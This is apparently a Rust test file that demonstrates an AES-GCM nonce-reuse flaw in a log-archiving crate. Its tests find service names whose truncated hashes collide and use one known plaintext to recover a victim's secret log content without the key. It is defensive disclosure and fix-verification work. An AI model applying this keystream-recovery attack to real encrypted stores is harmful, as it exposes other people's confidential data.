//! PROOF-OF-CONCEPT: a latent footgun in this crate's use of AES-256-GCM.
//!
//! This test does not assert that the code is correct — it *demonstrates the
//! footgun*, and passes **while it exists**. If the nonce scheme is fixed, these
//! tests start to fail, so they also serve as a fix-verification.
//!
//! Run with:  `cargo test -p obsidianlog-store --test nonce_reuse_poc -- --nocapture`
//!
//! ## The footgun
//!
//! AES-256-GCM has one non-negotiable rule: a `(key, nonce)` pair must **never**
//! repeat; a single repeat is catastrophic. Yet the way the pieces here are
//! wired together makes a repeat reachable:
//!
//! - the 96-bit nonce is derived deterministically as
//!   `SHA-256(service)[..4] || sequence(8B BE)`;
//! - `ArchiveEngine` encrypts **every** service under **one** shared
//!   `EncryptionKey`; and
//! - every service's chain starts at sequence 0.
//!
//! So cross-service nonce uniqueness rests entirely on a **32-bit truncated hash
//! of the service name**. Two services whose names collide in those four bytes
//! are sealed with the *identical* `(key, nonce)` at sequences 0, 1, 2, …. The
//! reused keystream then leaks the XOR of the two plaintexts **and** exposes the
//! GHASH subkey used to forge GCM authentication tags — a total break of both
//! confidentiality and the tamper-evidence guarantee for the affected chains.
//!
//! The service name is also **attacker-influenceable**: it is copied verbatim
//! from the `service` field of ingested log records, with no validation. Forcing
//! a collision is a ~2^32 offline prefix search (seconds on a GPU); an accidental
//! collision also arrives by the birthday bound (~50% near 2^16 services).
//!
//! ## Why "latent"
//!
//! The flaw is contained to a **single key**: every service is encrypted under
//! one shared `EncryptionKey`, so a collision only reuses a `(key, nonce)` pair
//! among services that share that key. It is also moot while the engine is run
//! with the all-zero default key, since that key is not secret. It becomes a
//! real exposure once a genuine secret key is in use, and the realistic triggers
//! are, in order of likelihood:
//!
//! 1. **Sequence-counter reset** — if the persisted per-service counter is lost
//!    or reset, a service restarts at sequence 0 and re-emits nonces it has
//!    already used under the same key. No attacker, no scale, no collision
//!    required.
//! 2. **High service-name cardinality** under one key — an accidental birthday
//!    collision (~50% near 2^16 distinct services; the `service` field is
//!    unbounded and set from log data).
//! 3. **An untrusted or injectable `service` value** combined with read access
//!    to the stored ciphertext — e.g. a compromised log source or
//!    attacker-influenced application data.
//!
//! The counter-based nonce is unique only *within* a single service, never
//! across services. A primitive that fails catastrophically on an ordinary
//! operational event like losing a counter is a footgun, not a safe default.
//!
//! ## The fix
//!
//! Make cross-service nonce uniqueness unconditional: put a per-service unique
//! integer id (assigned once and stored, not a truncated hash of the name) into
//! the nonce, or derive a distinct per-service subkey so no two services ever
//! share a key; and validate/normalize service names before use.
//!
//! ## What the tests below show
//!
//! 1. a cross-service nonce collision is cheap and deterministic to find;
//! 2. one shared key + a reused nonce leaks a victim's plaintext from ciphertext
//!    alone; and
//! 3. end-to-end through the real `ArchiveEngine`/`LocalBackend` pipeline, a
//!    victim service's secret log line is recovered with no access to the key.

use std::collections::HashMap;

use chrono::{DateTime, Utc};

use obsidianlog_core::record::{LogBatch, LogRecord};
use obsidianlog_store::ArchiveEngine;
use obsidianlog_store::backend::LocalBackend;
use obsidianlog_store::compress::{DEFAULT_LEVEL, compress, decompress};
use obsidianlog_store::encrypt::{EncryptionKey, NONCE_LEN, TAG_LEN, derive_nonce, encrypt_chunk};

/// Deterministically find two *distinct* service names that `derive_nonce` maps
/// to the **same** nonce (i.e. their `SHA-256[..4]` discriminators collide).
///
/// The search walks a fixed name sequence (`svc-0`, `svc-1`, …), so it returns
/// the same pair on every run — no flakiness. A 32-bit discriminator collides
/// by the birthday bound after ~2^16 names, so this terminates in well under a
/// second; the cap only guards against a logic error.
fn find_colliding_services() -> (String, String) {
    let mut seen: HashMap<[u8; NONCE_LEN], String> = HashMap::new();
    for i in 0u64..50_000_000 {
        let name = format!("svc-{i}");
        let nonce = derive_nonce(&name, 0);
        if let Some(prev) = seen.insert(nonce, name.clone()) {
            // Distinct names (the sequence is unique) with an identical nonce.
            return (prev, name);
        }
    }
    panic!("no 4-byte nonce-discriminator collision found — unexpected for a 32-bit space");
}

fn record(service: &str, epoch_secs: i64, msg: &str) -> LogRecord {
    LogRecord {
        raw: serde_json::json!({ "msg": msg }),
        timestamp: DateTime::<Utc>::from_timestamp(epoch_secs, 0).unwrap(),
        service: service.to_string(),
        level: Some("info".to_string()),
        host: Some("host-1".to_string()),
        trace_id: None,
    }
}

fn xor(a: &[u8], b: &[u8]) -> Vec<u8> {
    a.iter().zip(b).map(|(x, y)| x ^ y).collect()
}

/// (1) A cross-service nonce collision is cheap to find and deterministic, and a
/// discriminator collision means the nonce is identical at *every* sequence.
#[test]
fn nonce_collision_across_services_is_cheap_and_deterministic() {
    let (a, b) = find_colliding_services();

    assert_ne!(a, b, "must be two genuinely different service names");
    // Both are valid service names (non-empty, no path separators), so both are
    // legitimately usable by the ingest pipeline.
    for name in [&a, &b] {
        assert!(!name.is_empty() && !name.contains(['/', '\\']));
    }

    // Identical nonce at sequence 0 ...
    assert_eq!(derive_nonce(&a, 0), derive_nonce(&b, 0));
    // ... and therefore at EVERY sequence: only the 4-byte discriminator differs
    // by service, and it has collided.
    for seq in [1u64, 2, 42, 1_000_000] {
        assert_eq!(
            derive_nonce(&a, seq),
            derive_nonce(&b, seq),
            "a colliding discriminator forces an identical nonce at every sequence"
        );
    }

    eprintln!(
        "[poc]distinct services {a:?} and {b:?} share AES-GCM nonce {:02x?}",
        derive_nonce(&a, 0)
    );
}

/// (2) Primitive-level demonstration: one shared key + a reused nonce lets an
/// attacker recover a victim's plaintext from ciphertext alone — no key.
#[test]
fn shared_key_plus_colliding_nonce_leaks_victim_plaintext() {
    let (victim_service, attacker_service) = find_colliding_services();
    let nonce = derive_nonce(&victim_service, 0);
    assert_eq!(nonce, derive_nonce(&attacker_service, 0));

    // ObsidianLog uses ONE key for all services, so both services' chunks are
    // sealed under this same key. The attacker never learns it.
    let key = EncryptionKey::new([0x24; 32]);

    let victim_plaintext = b"login ok user=alice token=SECRET-DO-NOT-LEAK-abc123".to_vec();
    // Attacker-chosen plaintext (injected under the colliding service), at least
    // as long as the victim's so the recovered keystream fully covers it.
    let attacker_plaintext = vec![0x41u8; victim_plaintext.len() + 16];

    let victim_ct = encrypt_chunk(&key, nonce, &victim_plaintext).unwrap();
    let attacker_ct = encrypt_chunk(&key, nonce, &attacker_plaintext).unwrap();

    // ---- ATTACKER: no key used below. Only the two ciphertexts (store read),
    //      the nonce (public, lives in the chunk header), and the attacker's own
    //      known plaintext. ----
    let victim_body = &victim_ct[..victim_ct.len() - TAG_LEN];
    let attacker_body = &attacker_ct[..attacker_ct.len() - TAG_LEN];

    // GCM's CTR keystream depends on (key, nonce) ONLY, so it is identical for
    // both messages. Recover it from the attacker's own plaintext, then use it
    // to decrypt the victim.
    let keystream = xor(attacker_body, &attacker_plaintext);
    let recovered = xor(victim_body, &keystream[..victim_body.len()]);

    assert_eq!(
        recovered, victim_plaintext,
        "victim plaintext recovered WITHOUT the key — (key,nonce) reuse broke confidentiality"
    );
    eprintln!(
        "[poc]recovered victim plaintext without the key: {:?}",
        String::from_utf8_lossy(&recovered)
    );
}

/// (3) End-to-end through the real `ArchiveEngine`/`LocalBackend` pipeline: two
/// services with colliding names archive under one engine key; an attacker who
/// can post logs and read the store recovers the victim service's secret log
/// content with no access to the encryption key.
#[tokio::test]
async fn cross_service_nonce_reuse_breaks_confidentiality_through_the_engine() {
    let (victim_service, attacker_service) = find_colliding_services();

    let dir = tempfile::tempdir().unwrap();
    let backend = LocalBackend::new(dir.path(), "obsidianlog");
    // The victim's secret archive key. The attacker code below never touches it.
    let engine = ArchiveEngine::new(backend, EncryptionKey::new([0x7A; 32]), "obsidianlog");

    // Victim archives a small batch of SECRET logs. A single time window → one
    // chunk at sequence 0.
    let secret = "wire-transfer approved acct=1234567890 amount=1000000 memo=PROJECT-OBSIDIAN";
    let victim_records = vec![record(&victim_service, 10, secret)];
    engine
        .ingest_batch(LogBatch(victim_records.clone()))
        .await
        .unwrap();

    // Attacker posts a batch under the COLLIDING service name (the ingest server
    // takes `service` straight from the payload, unauthenticated). It must be at
    // least as large (compressed) as the victim's chunk; 400 varied records is
    // comfortably bigger. Also one window → one chunk at sequence 0.
    let attacker_records: Vec<LogRecord> = (0..400)
        .map(|i| {
            record(
                &attacker_service,
                100 + i,
                &format!("attacker filler line {i} xyzzy-{i}-padding-padding"),
            )
        })
        .collect();
    engine
        .ingest_batch(LogBatch(attacker_records.clone()))
        .await
        .unwrap();

    // ---- ATTACKER: everything below uses only store-read access + public
    //      knowledge of the (open-source) pipeline. No encryption key. ----

    // Read the raw stored chunks. `service_chunks` lists + fetches the framed
    // chunks; it does NOT decrypt, so it needs no key.
    let victim_chunk = engine.service_chunks(&victim_service).await.unwrap();
    let attacker_chunk = engine.service_chunks(&attacker_service).await.unwrap();
    assert_eq!(victim_chunk.len(), 1);
    assert_eq!(attacker_chunk.len(), 1);
    let victim_chunk = &victim_chunk[0];
    let attacker_chunk = &attacker_chunk[0];

    // The reuse really happened in the pipeline: two distinct services, both at
    // sequence 0, were assigned the SAME nonce under the one engine key.
    assert_eq!(victim_chunk.header.sequence, 0);
    assert_eq!(attacker_chunk.header.sequence, 0);
    assert_eq!(
        victim_chunk.header.nonce, attacker_chunk.header.nonce,
        "two distinct services were sealed under the same AES-GCM nonce"
    );

    // The engine encrypts `compress(serde_json(records), DEFAULT_LEVEL)`. The
    // attacker knows their own records and the public default level, so they
    // reconstruct exactly the plaintext their own chunk encrypted.
    let attacker_plaintext = compress(
        &serde_json::to_vec(&attacker_records).unwrap(),
        DEFAULT_LEVEL,
    )
    .unwrap();
    let attacker_body = &attacker_chunk.ciphertext[..attacker_chunk.ciphertext.len() - TAG_LEN];
    assert_eq!(
        attacker_body.len(),
        attacker_plaintext.len(),
        "reconstructed attacker plaintext must match the bytes the engine encrypted"
    );

    // Recover the shared keystream, then decrypt the victim chunk with it.
    let keystream = xor(attacker_body, &attacker_plaintext);
    let victim_body = &victim_chunk.ciphertext[..victim_chunk.ciphertext.len() - TAG_LEN];
    assert!(
        keystream.len() >= victim_body.len(),
        "attacker must inject at least as many compressed bytes as the victim chunk"
    );
    let recovered_compressed = xor(victim_body, &keystream[..victim_body.len()]);
    let recovered_plaintext = decompress(&recovered_compressed).unwrap();
    let recovered_records: Vec<LogRecord> = serde_json::from_slice(&recovered_plaintext).unwrap();

    // The victim's secret log line is fully recovered — no key was ever used.
    let recovered_msg = recovered_records[0]
        .raw
        .get("msg")
        .and_then(|v| v.as_str())
        .unwrap();
    assert_eq!(
        recovered_msg, secret,
        "recovered the victim service's secret log content with no encryption key"
    );
    eprintln!(
        "[poc]recovered victim SECRET through the engine, without the key: {recovered_msg:?}"
    );
}
